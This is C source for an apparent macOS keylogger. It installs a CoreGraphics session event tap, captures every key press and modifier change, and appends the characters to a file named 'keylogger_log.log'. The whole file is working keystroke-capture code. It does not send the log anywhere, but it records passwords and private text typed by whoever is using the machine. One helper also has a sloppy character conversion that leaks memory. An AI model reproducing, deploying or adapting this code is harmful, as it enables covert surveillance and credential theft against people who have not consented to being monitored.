// HEADERS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>

FILE * log_file;

// FUNCTIONS
void config();
void startListen();
CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void * userinfo);
char * getChar(int code);

int main(int argc, char * argv[]) {
	config();
	startListen();
	return 0;
}

void config() {
	log_file = fopen("keylogger_log.log", "a");
	if(log_file == NULL) {
		perror("Unable to create log file");
		exit(1);
	}
}

void startListen() {
	CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
	CFMachPortRef event = CGEventTapCreate(
		kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, mask, callback, NULL
	);

	if(event == NULL) {
		perror("Unable to create event tap");
		exit(1);
	}

	CFRunLoopSourceRef loopRef = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event, 0);
	CFRunLoopAddSource(CFRunLoopGetCurrent(), loopRef, kCFRunLoopCommonModes);
	CGEventTapEnable(event, true);
	CFRunLoopRun();
}


CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void * refcon) {
	if (type == kCGEventKeyDown) {
		UniChar content[32];
    	UniCharCount count;
    	CGEventKeyboardGetUnicodeString(event, 32, &count, content);

    	fprintf(log_file, "%s", getChar(*content));
    	fflush(log_file);
	}

	if (type == kCGEventFlagsChanged) {
		CGEventFlags flags = CGEventGetFlags(event);
		if ((flags & kCGEventFlagMaskAlphaShift) ||
			(flags & kCGEventFlagMaskShift) 	 ||
			(flags & kCGEventFlagMaskControl) 	 ||
			(flags & kCGEventFlagMaskAlternate)  ||
			(flags & kCGEventFlagMaskCommand)) {

			CGKeyCode keycode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

			fprintf(log_file, "%s", getChar(keycode));
    		fflush(log_file);
    	}
	}

    return event;
}

char * getChar(int code) {
	switch(code) {
		case 0x08: 	return "[DELETE]";
		case 0x1b:	return "[ESC]";
		case 0x1c:	return "[LEFTARROW]";
		case 0x1d:	return "[RIGHTARROW]";
		case 0x1e:	return "[UPARROW]";
		case 0x1f:	return "[DOWNARROW]";
		case 0x36:
 		case 0x37: 	
 					return "[COMMAND]";
 		case 0x3a:
 		case 0x3d: 	
 					return "[OPTION]";
 		case 0x3b:	return "[CONTROL]";
 		case 0x38:
 		case 0x3c:	
 					return "[SHIFT]";
 		case 0x39: 	return "[CAPSLOCK]";
		default:
			return strdup((char *) &code);
	}
}